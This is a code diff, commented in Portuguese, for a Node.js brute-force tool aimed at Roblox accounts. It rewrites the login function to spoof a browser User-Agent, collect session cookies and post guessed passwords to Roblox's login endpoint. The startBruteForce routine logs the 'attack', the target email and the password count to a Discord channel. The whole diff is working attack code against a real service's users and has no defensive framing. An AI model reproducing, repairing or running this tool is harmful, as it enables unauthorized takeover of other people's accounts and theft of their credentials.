@@ -26,37 +26,48 @@ async function sendDiscordMessage(content) {
     }
 }
 
-// Função para tentar Login no Roblox (USANDO MOBILE API)
+// Função para tentar Login no Roblox (COM COOKIE FIX)
 async function tryRobloxLogin(email, password) {
-    // Usar a API Mobile que é mais estável para bots
-    const loginUrl = "https://www.roblox.com/mobileapi/userinfo";
+    const baseUrl = "https://www.roblox.com";
+
+    // Criar um cliente Axios que partilha cookies
+    const client = axios.create({
+        baseURL: baseUrl,
+        timeout: 8000,
+        headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+            'Accept': 'application/json',
+            'Content-Type': 'application/json; charset=utf-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://www.roblox.com/login'
+        },
+        withCredentials: true // Importante para guardar os cookies do GET e usar no POST
+    });
 
     try {
-        // Fazer o POST direto para a Mobile API
-        const response = await axios.post(loginUrl, {
+        // 1. Fazer um GET no site principal para pegar os cookies iniciais
+        // Isto evita o erro 404 porque o Roblox vê que a sessão existe
+        const getResponse = await client.get('/');
+        
+        // 2. Tentar fazer Login no endpoint correto
+        const response = await client.post('/users/login', {
             username: email,
             password: password
-        }, {
-            headers: {
-                'User-Agent': 'RobloxApp/1 (iOS; 12.0)',
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            },
-            timeout: 8000
         });
 
-        // Se a resposta tiver 'userId' e 'username', foi sucesso
-        if (response.data.userId && response.data.username) {
+        // Se o Roblox devolver um ID, foi sucesso
+        if (response.data && response.data.id) {
             return {
                 success: true,
                 username: response.data.username,
-                userId: response.data.userId
+                userId: response.data.id
             };
         } else {
-            // Erro comum na Mobile API
+            // Se não tiver ID, verificar o erro
+            const errorMsg = response.data.error || "Erro Desconhecido";
             return {
                 success: false,
-                error: response.data.message || "Erro Desconhecido"
+                error: errorMsg
             };
         }
 
@@ -91,7 +102,7 @@ async function startBruteForce(email) {
     }
 
     console.log(`Iniciando ataque em: ${email} com ${passwords.length} senhas...`);
-    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}\n*Usando API Mobile...*`);
+    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}`);
 
     let found = false;
 
